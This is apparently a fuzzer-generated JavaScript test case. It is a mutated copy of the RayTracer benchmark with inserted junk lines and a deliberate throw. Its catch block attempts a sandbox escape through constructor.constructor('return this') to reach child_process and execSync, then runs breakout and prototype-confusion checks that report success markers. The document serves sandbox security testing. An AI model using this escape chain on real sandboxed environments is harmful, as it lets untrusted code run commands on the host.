try {
    var checkNumber;
    var Class = {
        create: function () {
            let REPLACER = 23;
            return function () {
                let REPLACER = 23;
                this.initialize.apply(this, arguments);
            };
        }
    };
    Object.extend = function (destination, source) {
        let REPLACER = 23;
        for (var property in source) {
            destination[property] = source[property];
        }
        return destination;
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Color = Class.create();
    Flog.RayTracer.Color.prototype = {
        red: 0,
        green: 0,
        blue: 0,
        initialize: function (r, g, b) {
            let REPLACER = 23;
            if (!r)
                r = 0;
            if (!g)
                g = 0;
            if (!b)
                b = 0;
            this.red = r;
            this.green = g;
            this.blue = b;
        },
        add: function (c1, c2) {
            let REPLACER = 23;
            var result = new Flog.RayTracer.Color(0, 0, 0);
            result.red = c1.red + c2.red;
            result.green = c1.green + c2.green;
            result.blue = c1.blue + c2.blue;
            return result;
        },
        addScalar: function (c1, s) {
            let REPLACER = 23;
            var result = new Flog.RayTracer.Color(0, 0, 0);
            result.red = c1.red + s;
            result.green = c1.green + s;
            result.blue = c1.blue + s;
            result.limit();
            return result;
        },
        subtract: function (c1, c2) {
            let REPLACER = 23;
            var result = new Flog.RayTracer.Color(0, 0, 0);
            result.red = c1.red - c2.red;
            result.green = c1.green - c2.green;
            result.blue = c1.blue - c2.blue;
            return result;
        },
        multiply: function (c1, c2) {
            let REPLACER = 23;
            var result = new Flog.RayTracer.Color(0, 0, 0);
            result.red = c1.red * c2.red;
            result.green = c1.green * c2.green;
            result.blue = c1.blue * c2.blue;
            return result;
        },
        multiplyScalar: function (c1, f) {
            let REPLACER = 23;
            var result = new Flog.RayTracer.Color(0, 0, 0);
            result.red = c1.red * f;
            result.green = c1.green * f;
            result.blue = c1.blue * f;
            return result;
        },
        divideFactor: function (c1, f) {
            let REPLACER = 23;
            var result = new Flog.RayTracer.Color(0, 0, 0);
            result.red = c1.red / f;
            result.green = c1.green / f;
            result.blue = c1.blue / f;
            return result;
        },
        limit: function () {
            let REPLACER = 23;
            this.red = this.red > 0 ? this.red > 1 ? 1 : this.red : 0;
            this.green = this.green > 0 ? this.green > 1 ? 1 : this.green : 0;
            this.blue = this.blue > 0 ? this.blue > 1 ? 1 : this.blue : 0;
        },
        distance: function (color) {
            let REPLACER = 23;
            var d = Math.abs(this.red - color.red) + Math.abs(this.green - color.green) + Math.abs(this.blue - color.blue);
            return d;
        },
        blend: function (c1, c2, w) {
            let REPLACER = 23;
            var result = new Flog.RayTracer.Color(0, 0, 0);
            result = Flog.RayTracer.Color.prototype.add(Flog.RayTracer.Color.prototype.multiplyScalar(c1, 1 - w), Flog.RayTracer.Color.prototype.multiplyScalar(c2, w));
            return result;
        },
        brightness: function () {
            let REPLACER = 23;
            var r = Math.floor(this.red * 255);
            var g = Math.floor(this.green * 255);
            var b = Math.floor(this.blue * 255);
            return r * 77 + g * 150 + b * 29 >> 8;
        },
        toString: function () {
            let REPLACER = 23;
            var r = Math.floor(this.red * 255);
            var g = Math.floor(this.green * 255);
            var b = Math.floor(this.blue * 255);
            return 'rgb(' + r + ',' + g + ',' + b + ')';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Light = Class.create();
    Flog.RayTracer.Light.prototype = {
        position: null,
        color: null,
        intensity: 10,
        initialize: function (pos, color, intensity) {
            let REPLACER = 23;
            this.position = pos;
            this.color = color;
            this.intensity = intensity ? intensity : 10;
        },
        getIntensity: function (distance) {
            let REPLACER = 23;
            if (distance >= intensity)
                return 0;
            return Math.pow((intensity - distance) / strength, 0.2);
        },
        toString: function () {
            let REPLACER = 23;
            return 'Light [' + this.position.x + ',' + this.position.y + ',' + this.position.z + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Vector = Class.create();
    Flog.RayTracer.Vector.prototype = {
        x: 0,
        y: 0,
        z: 0,
        initialize: function (x, y, z) {
            let REPLACER = 23;
            this.x = x ? x : 0;
            this.y = y ? y : 0;
            this.z = z ? z : 0;
        },
        copy: function (vector) {
            let REPLACER = 23;
            this.x = vector.x;
            this.y = vector.y;
            this.z = vector.z;
        },
        normalize: function () {
            let REPLACER = 23;
            var m = this.magnitude();
            return new Flog.RayTracer.Vector(this.x / m, this.y / m, this.z / m);
        },
        magnitude: function () {
            let REPLACER = 23;
            return Math.sqrt(this.x * this.x + this.y * this.y + this.z * this.z);
        },
        cross: function (w) {
            let REPLACER = 23;
            return new Flog.RayTracer.Vector(-this.z * w.y + this.y * w.z, this.z * w.x - this.x * w.z, -this.y * w.x + this.x * w.y);
        },
        dot: function (w) {
            let REPLACER = 23;
            return this.x * w.x + this.y * w.y + this.z * w.z;
        },
        add: function (v, w) {
            let REPLACER = 23;
            return new Flog.RayTracer.Vector(w.x + v.x, w.y + v.y, w.z + v.z);
        },
        subtract: function (v, w) {
            let REPLACER = 23;
            if (!w || !v)
                throw 'Vectors must be defined [' + v + ',' + w + ']';
            return new Flog.RayTracer.Vector(v.x - w.x, v.y - w.y, v.z - w.z);
        },
        multiplyVector: function (v, w) {
            let REPLACER = 23;
            return new Flog.RayTracer.Vector(v.x * w.x, v.y * w.y, v.z * w.z);
        },
        multiplyScalar: function (v, w) {
            let REPLACER = 23;
            return new Flog.RayTracer.Vector(v.x * w, v.y * w, v.z * w);
        },
        toString: function () {
            let REPLACER = 23;
            return 'Vector [' + this.x + ',' + this.y + ',' + this.z + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Ray = Class.create();
    Flog.RayTracer.Ray.prototype = {
        position: null,
        direction: null,
        initialize: function (pos, dir) {
            let REPLACER = 23;
            this.position = pos;
            this.direction = dir;
        },
        toString: function () {
            let REPLACER = 23;
            return 'Ray [' + this.position + ',' + this.direction + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Scene = Class.create();
    Flog.RayTracer.Scene.prototype = {
        camera: null,
        shapes: [],
        lights: [],
        background: null,
        initialize: function () {
            let REPLACER = 23;
            this.camera = new Flog.RayTracer.Camera(new Flog.RayTracer.Vector(0, 0, -5), new Flog.RayTracer.Vector(0, 0, 1), new Flog.RayTracer.Vector(0, 1, 0));
            this.shapes = new Array();
            this.lights = new Array();
            this.background = new Flog.RayTracer.Background(new Flog.RayTracer.Color(0, 0, 0.5), 0.2);
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    if (typeof Flog.RayTracer.Material == 'undefined')
        Flog.RayTracer.Material = {};
    Flog.RayTracer.Material.BaseMaterial = Class.create();
    Flog.RayTracer.Material.BaseMaterial.prototype = {
        gloss: 2,
        transparency: 0,
        reflection: 0,
        refraction: 0.5,
        hasTexture: false,
        initialize: function () {
            let REPLACER = 23;
        },
        getColor: function (u, v) {
            let REPLACER = 23;
        },
        wrapUp: function (t) {
            let REPLACER = 23;
            t = t % 2;
            if (t < -1)
                t += 2;
            if (t >= 1)
                t -= 2;
            return t;
        },
        toString: function () {
            let REPLACER = 23;
            return 'Material [gloss=' + this.gloss + ', transparency=' + this.transparency + ', hasTexture=' + this.hasTexture + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Material.Solid = Class.create();
    Flog.RayTracer.Material.Solid.prototype = Object.extend(new Flog.RayTracer.Material.BaseMaterial(), {
        initialize: function (color, reflection, refraction, transparency, gloss) {
            let REPLACER = 23;
            this.color = color;
            this.reflection = reflection;
            this.transparency = transparency;
            this.gloss = gloss;
            this.hasTexture = false;
        },
        getColor: function (u, v) {
            let REPLACER = 23;
            return this.color;
        },
        toString: function () {
            let REPLACER = 23;
            return 'SolidMaterial [gloss=' + this.gloss + ', transparency=' + this.transparency + ', hasTexture=' + this.hasTexture + ']';
        }
    });
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Material.Chessboard = Class.create();
    Flog.RayTracer.Material.Chessboard.prototype = Object.extend(new Flog.RayTracer.Material.BaseMaterial(), {
        colorEven: null,
        colorOdd: null,
        density: 0.5,
        initialize: function (colorEven, colorOdd, reflection, transparency, gloss, density) {
            let REPLACER = 23;
            this.colorEven = colorEven;
            this.colorOdd = colorOdd;
            this.reflection = reflection;
            this.transparency = transparency;
            this.gloss = gloss;
            this.density = density;
            this.hasTexture = true;
        },
        getColor: function (u, v) {
            let REPLACER = 23;
            var t = this.wrapUp(u * this.density) * this.wrapUp(v * this.density);
            if (t < 0)
                return this.colorEven;
            else
                return this.colorOdd;
        },
        toString: function () {
            let REPLACER = 23;
            return 'ChessMaterial [gloss=' + this.gloss + ', transparency=' + this.transparency + ', hasTexture=' + this.hasTexture + ']';
        }
    });
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    if (typeof Flog.RayTracer.Shape == 'undefined')
        Flog.RayTracer.Shape = {};
    Flog.RayTracer.Shape.BaseShape = Class.create();
    Flog.RayTracer.Shape.BaseShape.prototype = {
        position: null,
        material: null,
        initialize: function () {
            let REPLACER = 23;
            this.position = new Vector(0, 0, 0);
            this.material = new Flog.RayTracer.Material.SolidMaterial(new Flog.RayTracer.Color(1, 0, 1), 0, 0, 0);
        },
        toString: function () {
            let REPLACER = 23;
            return 'Material [gloss=' + this.gloss + ', transparency=' + this.transparency + ', hasTexture=' + this.hasTexture + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    if (typeof Flog.RayTracer.Shape == 'undefined')
        Flog.RayTracer.Shape = {};
    Flog.RayTracer.Shape.Sphere = Class.create();
    Flog.RayTracer.Shape.Sphere.prototype = {
        initialize: function (pos, radius, material) {
            let REPLACER = 23;
            this.radius = radius;
            this.position = pos;
            this.material = material;
        },
        intersect: function (ray) {
            let REPLACER = 23;
            var info = new Flog.RayTracer.IntersectionInfo();
            info.shape = this;
            var dst = Flog.RayTracer.Vector.prototype.subtract(ray.position, this.position);
            var B = dst.dot(ray.direction);
            var C = dst.dot(dst) - this.radius * this.radius;
            var D = B * B - C;
            if (D > 0) {
                info.isHit = true;
                info.distance = -B - Math.sqrt(D);
                info.position = Flog.RayTracer.Vector.prototype.add(ray.position, Flog.RayTracer.Vector.prototype.multiplyScalar(ray.direction, info.distance));
                info.normal = Flog.RayTracer.Vector.prototype.subtract(info.position, this.position).normalize();
                info.color = this.material.getColor(0, 0);
            } else {
                info.isHit = false;
            }
            return info;
        },
        toString: function () {
            let REPLACER = 23;
            return 'Sphere [position=' + this.position + ', radius=' + this.radius + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    if (typeof Flog.RayTracer.Shape == 'undefined')
        Flog.RayTracer.Shape = {};
    Flog.RayTracer.Shape.Plane = Class.create();
    Flog.RayTracer.Shape.Plane.prototype = {
        d: 0,
        initialize: function (pos, d, material) {
            throw () => {
                return () => {
                };
            };
            this.position = pos;
            this.d = d;
            this.material = material;
        },
        intersect: function (ray) {
            var info = new Flog.RayTracer.IntersectionInfo();
            var Vd = this.position.dot(ray.direction);
            if (Vd == 0)
                return info;
            var t = -(this.position.dot(ray.position) + this.d) / Vd;
            if (t <= 0)
                return info;
            info.shape = this;
            info.isHit = true;
            info.position = Flog.RayTracer.Vector.prototype.add(ray.position, Flog.RayTracer.Vector.prototype.multiplyScalar(ray.direction, t));
            info.normal = this.position;
            info.distance = t;
            if (this.material.hasTexture) {
                var vU = new Flog.RayTracer.Vector(this.position.y, this.position.z, -this.position.x);
                var vV = vU.cross(this.position);
                var u = info.position.dot(vU);
                var v = info.position.dot(vV);
                info.color = this.material.getColor(u, v);
            } else {
                info.color = this.material.getColor(0, 0);
            }
            return info;
        },
        toString: function () {
            return 'Plane [' + this.position + ', d=' + this.d + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.IntersectionInfo = Class.create();
    Flog.RayTracer.IntersectionInfo.prototype = {
        isHit: false,
        hitCount: 0,
        shape: null,
        position: null,
        normal: null,
        color: null,
        distance: null,
        initialize: function () {
            this.color = new Flog.RayTracer.Color(0, 0, 0);
        },
        toString: function () {
            return 'Intersection [' + this.position + ']';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Camera = Class.create();
    Flog.RayTracer.Camera.prototype = {
        position: null,
        lookAt: null,
        equator: null,
        up: null,
        screen: null,
        initialize: function (pos, lookAt, up) {
            this.position = pos;
            this.lookAt = lookAt;
            this.up = up;
            this.equator = lookAt.normalize().cross(this.up);
            this.screen = Flog.RayTracer.Vector.prototype.add(this.position, this.lookAt);
        },
        getRay: function (vx, vy) {
            var pos = Flog.RayTracer.Vector.prototype.subtract(this.screen, Flog.RayTracer.Vector.prototype.subtract(Flog.RayTracer.Vector.prototype.multiplyScalar(this.equator, vx), Flog.RayTracer.Vector.prototype.multiplyScalar(this.up, vy)));
            pos.y = pos.y * -1;
            var dir = Flog.RayTracer.Vector.prototype.subtract(pos, this.position);
            var ray = new Flog.RayTracer.Ray(pos, dir.normalize());
            return ray;
        },
        toString: function () {
            return 'Ray []';
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Background = Class.create();
    Flog.RayTracer.Background.prototype = {
        color: null,
        ambience: 0,
        initialize: function (color, ambience) {
            this.color = color;
            this.ambience = ambience;
        }
    };
    if (typeof Flog == 'undefined')
        var Flog = {};
    if (typeof Flog.RayTracer == 'undefined')
        Flog.RayTracer = {};
    Flog.RayTracer.Engine = Class.create();
    Flog.RayTracer.Engine.prototype = {
        canvas: null,
        initialize: function (options) {
            this.options = Object.extend({
                canvasHeight: 100,
                canvasWidth: 100,
                pixelWidth: 2,
                pixelHeight: 2,
                renderDiffuse: false,
                renderShadows: false,
                renderHighlights: false,
                renderReflections: false,
                rayDepth: 2
            }, options || {});
            this.options.canvasHeight /= this.options.pixelHeight;
            this.options.canvasWidth /= this.options.pixelWidth;
        },
        setPixel: function (x, y, color) {
            var pxW, pxH;
            pxW = this.options.pixelWidth;
            pxH = this.options.pixelHeight;
            if (this.canvas) {
                this.canvas.fillStyle = color.toString();
                this.canvas.fillRect(x * pxW, y * pxH, pxW, pxH);
            } else {
                if (x === y) {
                    checkNumber += color.brightness();
                }
            }
        },
        renderScene: function (scene, canvas) {
            checkNumber = 0;
            if (canvas) {
                this.canvas = canvas.getContext('2d');
            } else {
                this.canvas = null;
            }
            var canvasHeight = this.options.canvasHeight;
            var canvasWidth = this.options.canvasWidth;
            for (var y = 0; y < canvasHeight; y++) {
                for (var x = 0; x < canvasWidth; x++) {
                    var yp = y * 1 / canvasHeight * 2 - 1;
                    var xp = x * 1 / canvasWidth * 2 - 1;
                    var ray = scene.camera.getRay(xp, yp);
                    var color = this.getPixelColor(ray, scene);
                    this.setPixel(x, y, color);
                }
            }
            if (checkNumber !== 2321) {
                throw new Error('Scene rendered incorrectly');
            }
        },
        getPixelColor: function (ray, scene) {
            var info = this.testIntersection(ray, scene, null);
            if (info.isHit) {
                var color = this.rayTrace(info, ray, scene, 0);
                return color;
            }
            return scene.background.color;
        },
        testIntersection: function (ray, scene, exclude) {
            var hits = 0;
            var best = new Flog.RayTracer.IntersectionInfo();
            best.distance = 2000;
            for (var i = 0; i < scene.shapes.length; i++) {
                var shape = scene.shapes[i];
                if (shape != exclude) {
                    var info = shape.intersect(ray);
                    if (info.isHit && info.distance >= 0 && info.distance < best.distance) {
                        best = info;
                        hits++;
                    }
                }
            }
            best.hitCount = hits;
            return best;
        },
        getReflectionRay: function (P, N, V) {
            var c1 = -N.dot(V);
            var R1 = Flog.RayTracer.Vector.prototype.add(Flog.RayTracer.Vector.prototype.multiplyScalar(N, 2 * c1), V);
            return new Flog.RayTracer.Ray(P, R1);
        },
        rayTrace: function (info, ray, scene, depth) {
            var color = Flog.RayTracer.Color.prototype.multiplyScalar(info.color, scene.background.ambience);
            var oldColor = color;
            var shininess = Math.pow(10, info.shape.material.gloss + 1);
            for (var i = 0; i < scene.lights.length; i++) {
                var light = scene.lights[i];
                var v = Flog.RayTracer.Vector.prototype.subtract(light.position, info.position).normalize();
                if (this.options.renderDiffuse) {
                    var L = v.dot(info.normal);
                    if (L > 0) {
                        color = Flog.RayTracer.Color.prototype.add(color, Flog.RayTracer.Color.prototype.multiply(info.color, Flog.RayTracer.Color.prototype.multiplyScalar(light.color, L)));
                    }
                }
                if (depth <= this.options.rayDepth) {
                    if (this.options.renderReflections && info.shape.material.reflection > 0) {
                        var reflectionRay = this.getReflectionRay(info.position, info.normal, ray.direction);
                        var refl = this.testIntersection(reflectionRay, scene, info.shape);
                        if (refl.isHit && refl.distance > 0) {
                            refl.color = this.rayTrace(refl, reflectionRay, scene, depth + 1);
                        } else {
                            refl.color = scene.background.color;
                        }
                        color = Flog.RayTracer.Color.prototype.blend(color, refl.color, info.shape.material.reflection);
                    }
                }
                var shadowInfo = new Flog.RayTracer.IntersectionInfo();
                if (this.options.renderShadows) {
                    var shadowRay = new Flog.RayTracer.Ray(info.position, v);
                    shadowInfo = this.testIntersection(shadowRay, scene, info.shape);
                    if (shadowInfo.isHit && shadowInfo.shape != info.shape) {
                        var vA = Flog.RayTracer.Color.prototype.multiplyScalar(color, 0.5);
                        var dB = 0.5 * Math.pow(shadowInfo.shape.material.transparency, 0.5);
                        color = Flog.RayTracer.Color.prototype.addScalar(vA, dB);
                    }
                }
                if (this.options.renderHighlights && !shadowInfo.isHit && info.shape.material.gloss > 0) {
                    var Lv = Flog.RayTracer.Vector.prototype.subtract(info.shape.position, light.position).normalize();
                    var E = Flog.RayTracer.Vector.prototype.subtract(scene.camera.position, info.shape.position).normalize();
                    var H = Flog.RayTracer.Vector.prototype.subtract(E, Lv).normalize();
                    var glossWeight = Math.pow(Math.max(info.normal.dot(H), 0), shininess);
                    color = Flog.RayTracer.Color.prototype.add(Flog.RayTracer.Color.prototype.multiplyScalar(light.color, glossWeight), color);
                }
            }
            color.limit();
            return color;
        }
    };
    function renderScene() {
        var scene = new Flog.RayTracer.Scene();
        scene.camera = new Flog.RayTracer.Camera(new Flog.RayTracer.Vector(0, 0, -15), new Flog.RayTracer.Vector(-0.2, 0, 5), new Flog.RayTracer.Vector(0, 1, 0));
        scene.background = new Flog.RayTracer.Background(new Flog.RayTracer.Color(0.5, 0.5, 0.5), 0.4);
        var sphere = new Flog.RayTracer.Shape.Sphere(new Flog.RayTracer.Vector(-1.5, 1.5, 2), 1.5, new Flog.RayTracer.Material.Solid(new Flog.RayTracer.Color(0, 0.5, 0.5), 0.3, 0, 0, 2));
        var sphere1 = new Flog.RayTracer.Shape.Sphere(new Flog.RayTracer.Vector(1, 0.25, 1), 0.5, new Flog.RayTracer.Material.Solid(new Flog.RayTracer.Color(0.9, 0.9, 0.9), 0.1, 0, 0, 1.5));
        var plane = new Flog.RayTracer.Shape.Plane(new Flog.RayTracer.Vector(0.1, 0.9, -0.5).normalize(), 1.2, new Flog.RayTracer.Material.Chessboard(new Flog.RayTracer.Color(1, 1, 1), new Flog.RayTracer.Color(0, 0, 0), 0.2, 0, 1, 0.7));
        scene.shapes.push(plane);
        scene.shapes.push(sphere);
        scene.shapes.push(sphere1);
        var light = new Flog.RayTracer.Light(new Flog.RayTracer.Vector(5, 10, -1), new Flog.RayTracer.Color(0.8, 0.8, 0.8));
        var light1 = new Flog.RayTracer.Light(new Flog.RayTracer.Vector(-3, 5, -15), new Flog.RayTracer.Color(0.8, 0.8, 0.8), 100);
        scene.lights.push(light);
        scene.lights.push(light1);
        var imageWidth = 100;
        var imageHeight = 100;
        var pixelSize = '5,5'.split(',');
        var renderDiffuse = true;
        var renderShadows = true;
        var renderHighlights = true;
        var renderReflections = true;
        var rayDepth = 2;
        var raytracer = new Flog.RayTracer.Engine({
            canvasWidth: imageWidth,
            canvasHeight: imageHeight,
            pixelWidth: pixelSize[0],
            pixelHeight: pixelSize[1],
            'renderDiffuse': renderDiffuse,
            'renderHighlights': renderHighlights,
            'renderShadows': renderShadows,
            'renderReflections': renderReflections,
            'rayDepth': rayDepth
        });
        raytracer.renderScene(scene, null, 0);
    }
    for (var i = 0; i < 6; ++i)
        renderScene();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}